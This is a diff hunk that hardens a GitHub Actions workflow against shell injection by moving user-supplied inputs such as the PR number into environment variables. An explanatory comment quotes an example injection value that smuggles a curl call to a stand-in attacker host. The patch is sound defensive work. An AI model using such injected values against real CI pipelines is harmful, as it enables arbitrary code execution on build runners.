@@ -47,11 +47,19 @@ jobs:
     steps:
       - name: Resolve PR number
         id: pr
+        # Pass user-controlled inputs through `env` and reference them
+        # as shell variables — never interpolate `${{ ... }}` directly
+        # into a `run:` block, which would let a hostile workflow_dispatch
+        # input like `1"; curl evil.example.com; echo "` execute as code.
+        env:
+          INPUT_PR_NUMBER: ${{ github.event.inputs.pr_number }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          EVENT_NAME: ${{ github.event_name }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            echo "number=${{ github.event.inputs.pr_number }}" >> "$GITHUB_OUTPUT"
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            echo "number=$INPUT_PR_NUMBER" >> "$GITHUB_OUTPUT"
           else
-            echo "number=${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
+            echo "number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
           fi
 
       - name: Acknowledge trigger
